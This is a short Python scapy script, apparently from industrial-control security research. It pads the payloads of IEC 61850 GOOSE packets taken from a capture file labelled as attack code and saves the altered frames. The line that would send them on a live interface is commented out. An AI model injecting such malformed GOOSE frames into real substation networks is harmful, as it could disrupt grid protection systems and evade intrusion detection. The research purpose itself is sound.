from scapy.all import *
import os
import sys
import inspect

from gooseFunc import *


# Function to check if the packet is a GOOSE packet
def goose_check(packet, GOOSE_TYPE):
    return packet.haslayer(Ether) and packet[Ether].type == GOOSE_TYPE

# Load the packets
pkts = rdpcap('Attack codes\goose_exploit\ids_bust_boolean.pcapng')

packets = pkts[0:5]
# Define constants
GOOSE_TYPE = 0x88b8
networkInterface = "eth1"

# Process each packet
for packet in packets:
    if goose_check(packet, GOOSE_TYPE):
        # Access the GOOSE payload
        goose_payload = packet[Raw].load
        
        # Increase the payload size by adding padding (100 bytes in this example)
        padding = b'\x00' * 100
        new_goose_payload = goose_payload + padding
        
        # Update the GOOSE payload in the packet
        packet[Raw].load = new_goose_payload
        
        # Recalculate the entire packet's length and any necessary checksums
        packet = Ether(raw(packet))
        
    
        
        # Send the modified packet (replace 'eth1' with your network interface)
        # sendp(packet, iface=networkInterface)

# Save the modified packets to a new pcap file
wrpcap('g_len4.pcap', packets)
